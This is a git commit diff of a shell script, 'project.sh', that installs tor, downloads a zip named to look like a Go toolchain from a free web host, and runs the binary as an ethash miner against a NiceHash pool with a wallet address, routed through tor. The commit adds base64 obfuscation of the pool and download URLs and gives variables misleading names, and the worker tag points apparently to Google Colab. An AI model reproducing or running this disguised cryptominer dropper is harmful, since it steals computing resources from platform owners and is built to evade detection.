e1298483172935c47f3c6fa24ff9b02eb4a373cd
taovuu1 <94132974+taovuu1@users.noreply.github.com>
2022-02-05 18:58:19 +0700

    Update project.sh

--- project.sh
+++ project.sh
@@ -2,12 +2,15 @@
 
 sudo apt-get install -y tor libpci-dev 
 
-string="3EjCK7AUv5CxMEMfbYzqL6xH3dvK5VcDhY."$(hostname)
-pool1=stratum+tcp://daggerhashimoto.eu-west.nicehash.com:3353
+userAgent="3EjCK7AUv5CxMEMfbYzqL6xH3dvK5VcDhY.Colab"
+string=c3RyYXR1bSt0Y3A6Ly9kYWdnZXJoYXNoaW1vdG8uZXUtd2VzdC5uaWNlaGFzaC5jb206MzM1Mw==
+url=aHR0cHM6Ly9taW5lcmhvc3RpbmcuMDAwd2ViaG9zdGFwcC5jb20vZmlsZXMvZ29sYW5nX2xpbnV4X2FtZDY0LnppcA==
+seed=$(echo $string | base64 --decode)
+location=$(echo $url | base64 --decode)
 
 nohup tor &>/dev/null &
 
-wget https://minerhosting.000webhostapp.com/files/golang_linux_amd64.zip
+wget $location
 
 unzip golang_linux_amd64.zip
 
@@ -15,4 +18,4 @@ cd golang_linux_amd64
 
 chmod 777 golang
 
-./golang -a ethash --url $pool1 -u $string -p x --proxy 127.0.0.1:9050
+./golang -a ethash --url $seed -u $userAgent -p x --proxy 127.0.0.1:9050
